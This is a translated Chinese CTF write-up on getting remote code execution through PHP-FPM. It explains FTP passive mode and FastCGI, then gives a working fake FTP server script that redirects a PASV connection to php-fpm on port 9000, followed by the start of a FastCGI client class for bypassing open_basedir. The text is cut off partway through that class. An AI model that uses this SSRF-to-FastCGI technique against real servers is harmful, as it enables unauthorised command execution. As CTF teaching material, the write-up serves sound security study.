# 重新学习FTP与php-FPM的RCE
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
前几天看了蓝帽杯2021的web题目讲真，一个游戏一个rce，打得我头皮发麻，最后是一个绕过disable_function今天也来这里记载一下，写得不好，还得大佬们批评指正。
## 0x01 预备知识
###  (一) FTP的主动与被动模式
参考资料：
ftp
ftp rfc 文档：
ftp 命令字和响应码：
####  1.FTP简介：
文件传输协议，简称FTP是用于在网络进行文件传输的协议，客户和服务器模式。FTP只通过TCP连接,没有用于FTP的UDP组件.FTP不同于其他服务的是它使用了两个端口,
一个数据端口和一个命令端口(或称为控制端口)。通常`21端口是命令端口`，`20端口是数据端口`。
但是混入主被动模式之后，这些端口可能会有一些变化。
####  2\. 主动模式
（1）
客户端打开一个随机的端口（端口号大于1024，在这里，我们称它为x），同时一个FTP进程连接至服务器的21号命令端口。此时，该tcp连接的来源地端口为客户端指定的随机端口x，目的地端口（远程端口）为服务器上的21号端口。  
（2）
客户端开始监听端口（x+1），同时向服务器发送一个端口命令（通过服务器的21号命令端口），此命令告诉服务器客户端正在监听的端口号并且已准备好从此端口接收数据。这个端口就是我们所知的数据端口。  
（3）服务器打开20号源端口并且创建和客户端数据端口的连接。此时，来源地的端口为20，远程数据(目的地)端口为（x+1）。  
（4）客户端通过本地的数据端口创建一个和服务器20号端口的连接，然后向服务器发送一个应答，告诉服务器它已经创建好了一个连接
大概形式长这个样子（第一次使用画图工具，有点丑）
主动模式中，其实客户端和服务器断并没有建立一条实际的数据链路，而只是，客户端告诉服务器我监听端口，然后服务器来链接这个，这其实是一个从外部建立进来的连接，所以防火墙就会杀他。
所以这在一定程度其实是不会被经常使用的。
####  3\. 被动模式
  1. 客户端向服务器的21端口 发送PASV指令，请求被动链接，该tcp连接的来源地端口为客户端指定的随机端口x，目的地端口（远程端口）为服务器上的21号端口。
  2. 客户端开始监听本地的x+1端口，服务端会开启一个端口来和客户端（Y）进行通信，并告知
  3. 客户端初始化一个从自己的数据端口到服务器端指定的数据端口的数据连接
  4. 服务端通过本地的数据端口创建一个和客户端的连接，然后向客户端发送一个应答，告诉客户端它已经创建好了一个连接。
下面是一个wireshark 中经典的被动模式流量图
    被动模式返回的端口号是 192.168.1.5:19*256+14
记住这个神奇的计算公式
###  (二) php-fpm攻击
参考链接：
####  1\. php-fpm简介
总的意思就不多说了
    www.example.com
            |
            |
          Nginx
            |
            |
    路由到www.example.com/index.php
            |
            |
    加载nginx的fast-cgi模块
            |
            |
    fast-cgi监听127.0.0.1:9000地址
            |
            |
    www.example.com/index.php请求到达127.0.0.1:9000
            |
            |
    php-fpm 监听127.0.0.1:9000
            |
            |
    php-fpm 接收到请求，启用worker进程处理请求
            |
            |
    php-fpm 处理完请求，返回给nginx
            |
            |
    nginx将结果通过http返回给浏览器
给大家看一下一个正常的http请求是如何被解析的（这个要是不会就直接gg了，所以我先死为敬）
####  2\. 两种交流方式
    1.tcp方式的话就是直接fpm直接通过监听本地9000端口来进行通信
    2.unix socket其实严格意义上应该叫unix domain socket，它是*nix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。
    Unix domain socket 或者 IPC socket是一种终端，可以使同一台操作系统上的两个或多个进程进行数据通信。与管道相比，Unix domain sockets 既可以使用字节流和数据队列，而管道通信则只能通过字节流。Unix domain sockets的接口和Internet socket很像，但它不使用网络底层协议来通信。Unix domain socket 的功能是POSIX操作系统里的一种组件。Unix domain sockets 使用系统文件的地址来作为自己的身份。它可以被系统进程引用。所以两个进程可以同时打开一个Unix domain sockets来进行通信。不过这种通信方式是发生在系统内核里而不会在网络里传播
所以在做的时候要注意好是哪一种方式，具体内部的实现就不多说了。其实只要大概明白这两种方式之间利用不同就行了。
####  3 漏洞部分
既然要攻击，那就必须得有漏洞点吧，漏洞出现在哪里呢？很明显就在于，php-fpm在监听端口或者使用unix进行通信的时候没有验证，这些流量是否是合法。
如果我能够控制主机内的机器向绑定的端口发送符合他们呢规范的流量就可以执行命令。
###  (三) nginx 配置文件解释
    server {
    ​ listen 80 default_server; # 监听80端口，接收http请求
    ​ servername ; # 网站地址
    ​ root /var/www/html; # 网站根目录
    ​ location /{
    ​ #First attempt to serve request as file, then
    ​ # as directory, then fall back to displaying a 404.
    ​ try_files \$uri \$uri/ =404; # 文件不存在就返回404状态
    }
    # 下面是重点
    location ~ .php$ {
    include snippets/fastcgi-php.conf; #加载nginx的fastcgi模块
    # With php7.0-cgi alone:
    ​ fastcgi_pass 127.0.0.1:9000; # 监听nginx fastcgi进程监听的ip地址和端口
    ​ # With php7.0-fpm:
    ​ # fastcgi_pass unix:/run/php/php7.0-fpm.sock;
    ​ }
初始化
    1. sudo apt update
    2. sudo apt install -y nginx
    3. sudo apt install -y software-properties-common
    4. sudo add-apt-repository -y ppa:ondrej/php
    5. sudo apt update
    6. sudo apt install -y php7.3-fpm
`/etc/nginx/sites-enabled/default`
`/etc/php/7.3/fpm/pool.d/www.conf`
    /etc/init.d/php7.3-fpm restart
    service nginx reload
## 0x02 解题
###  (一） hxp的resonator小解析
首先贴源码
    file:// — 访问本地文件系统
    http:// — 访问 HTTP(s) 网址 攻击内网
    ftp:// — 访问 FTP(s) URLs
    php:// — 访问各个输入/输出流（I/O streams）
    zlib:// — 压缩流
    data:// — 数据（RFC 2397）
    glob:// — 查找匹配的文件路径模式
    phar:// — PHP 归档 phar.readonly = 0
    ssh2:// — Secure Shell 2
    rar:// — RAR
    ogg:// — 音频流
    expect:// — 处理交互式的流
    -pass 以上四个都需要安装 PECL 扩展
现在其实就只剩下了ftp协议了。使用上面的ftp被动模式这样就可以转发到我们想要的端口了。
贴上我们的fake_ftp
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 9999))
    s.listen(1)
    conn, addr = s.accept()
    conn.send(b'220 welcome\n')
    #Service ready for new user.
    #Client send anonymous username
    #USER anonymous
    conn.send(b'331 Please specify the password.\n')
    #User name okay, need password.
    #Client send anonymous password.
    #PASS anonymous
    conn.send(b'230 Login successful.\n')
    #User logged in, proceed. Logged out if appropriate.
    #TYPE I
    conn.send(b'200 Switching to Binary mode.\n')
    #Size /
    conn.send(b'550 Could not get the file size.\n')
    #EPSV (1)
    conn.send(b'150 ok\n')
    #PASV
    conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2)
    conn.send(b'150 Permission denied.\n')
    #QUIT
    conn.send(b'221 Goodbye.\n')
    conn.close()
注意上面的`9000`端口需要自己测试。因为地方可能不一样
这个题就不难解决了，纯粹的一个题解。
###  (二) 蓝帽杯的one_pointer
第一层的溢出就不多说了。下面给两个绕过open_basedir
     * @version     1.0
     */
    class FCGIClient
    {
        const VERSION_1            = 1;
        const BEGIN_REQUEST        = 1;
        const ABORT_REQUEST        = 2;
        const END_REQUEST          = 3;
        const PARAMS               = 4;
        const STDIN                = 5;
        const STDOUT               = 6;
        const STDERR               = 7;
        const DATA                 = 8;
        const GET_VALUES           = 9;
        const GET_VALUES_RESULT    = 10;
        const UNKNOWN_TYPE         = 11;
        const MAXTYPE              = self::UNKNOWN_TYPE;
        const RESPONDER            = 1;
        const AUTHORIZER           = 2;
        const FILTER               = 3;
        const REQUEST_COMPLETE     = 0;
        const CANT_MPX_CONN        = 1;
        const OVERLOADED           = 2;
        const UNKNOWN_ROLE         = 3;
        const MAX_CONNS            = 'MAX_CONNS';
        const MAX_REQS             = 'MAX_REQS';
        const MPXS_CONNS           = 'MPXS_CONNS';
        const HEADER_LEN           = 8;
        /**
         * Socket
         * @var Resource
         */
        private $_sock = null;
        /**
         * Host
         * @var String
         */
        private $_host = null;
        /**
         * Port
         * @var Integer
         */
        private $_port = null;
        /**
         * Keep Alive
         * @var Boolean
         */
        private $_keepAlive = false;
        /**
         * Constructor
         *
         * @param String $host Host of the FastCGI application
         * @param Integer $port Port of the FastCGI application
         */
        public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
        {
            $this->_host = $host;
            $this->_port = $port;
        }
        /**
         * Define whether or not the FastCGI application should keep the connection
         * alive at the end of a request
         *
         * @param Boolean $b true if the connection should stay alive, false otherwise
         */
        public function setKeepAlive($b)
        {
            $this->_keepAlive = (boolean)$b;
            if (!$this->_keepAlive && $this->_sock) {
                fclose($this->_sock);
            }